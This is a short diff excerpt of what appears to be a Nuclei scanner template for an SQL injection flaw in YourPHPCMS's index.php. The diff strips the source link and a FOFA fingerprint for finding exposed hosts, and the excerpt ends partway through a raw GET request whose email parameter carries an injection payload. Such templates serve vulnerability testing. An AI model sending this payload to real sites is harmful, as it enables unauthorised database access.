@@ -3,12 +3,8 @@ info:
   name: YourPHPCMS index.php存在sql注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xwow4rgixodmkfkd'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xwow4rgixodmkfkd
-    fofa: header="YP_onlineid"
 http:
 - raw:
   - 'GET /index.php?g=User&m=Register&a=checkEmail&userid=1&email=-69710348@nwcrb.com''+or+''1''=''2" HTTP/1.1
